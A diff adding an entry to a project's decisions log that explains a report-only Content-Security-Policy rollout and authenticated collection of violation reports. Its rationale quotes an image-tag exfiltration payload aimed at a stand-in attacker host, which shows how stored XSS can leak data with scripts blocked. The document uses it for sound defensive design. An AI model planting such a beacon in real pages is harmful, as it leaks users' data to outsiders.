@@ -6,6 +6,18 @@ Maintained via the `/decisions` skill. See `~/.claude/skills/decisions/SKILL.md`
 
 ---
 
+## 2026-08-16: CSP ships report-only, and its violations are collected authenticated
+
+**Decision:** Split the app's Content-Security-Policy in two. A small enforcing header (`frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, plus `upgrade-insecure-requests` in production) ships immediately from `next.config.ts` alongside `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy` and HSTS. The full candidate policy — `default-src 'self'`, nonce-based `script-src 'self'`, `img-src 'self' data: blob:` — ships as `Content-Security-Policy-Report-Only` from `src/proxy.ts`, which is the only place a per-request nonce can be minted. Violations are collected from the `securitypolicyviolation` DOM event and forwarded through the existing authenticated `/api/log/client`; no `report-uri`/`report-to` endpoint is added, and `AUTH_EXEMPT_PREFIXES` is unchanged. Flipping the candidate policy to enforcing is a separate, later change that must be justified by the collected reports.
+
+**Rationale:** A CSP that breaks the app is worse than no CSP, and this repo deploys straight to a single live box with no staging tier — so the directives that can block a resource are measured before they are enforced, while the directives that cannot (framing, `<object>`, `<base>`, form targets) get no such grace period. A standards `report-uri` collector would have to accept unauthenticated POSTs, because browsers strip credentials from violation reports; that means widening the auth-exempt surface and putting an abusable write endpoint on the public internet, to buy report coverage that a single-user dashboard gets from the DOM event for free. `img-src` is the directive that actually matters here: DOMPurify preserves `<img src="https://attacker/?leak=...">`, so the stored-XSS class from #492 can still exfiltrate through an image beacon with scripts fully blocked.
+
+**Status:** active
+
+**References:** #501, #492, `apps/web/src/lib/security-headers.ts`, `apps/web/src/proxy.ts`, `apps/web/next.config.ts`, `apps/web/src/components/ClientLogBootstrap.tsx`
+
+---
+
 ## 2026-08-11: Production deploys gate on the contained Cursor launcher
 
 **Decision:** Install Cursor Agent at the standardized runtime path `/home/george/.local/bin/cursor-agent` and make `scripts/deploy` run a launcher canary before build or restart. The canary executes `--version` with the same manifest-backed minimal PATH used by Coach, and `scripts/deploy --check` reports the same readiness signal.
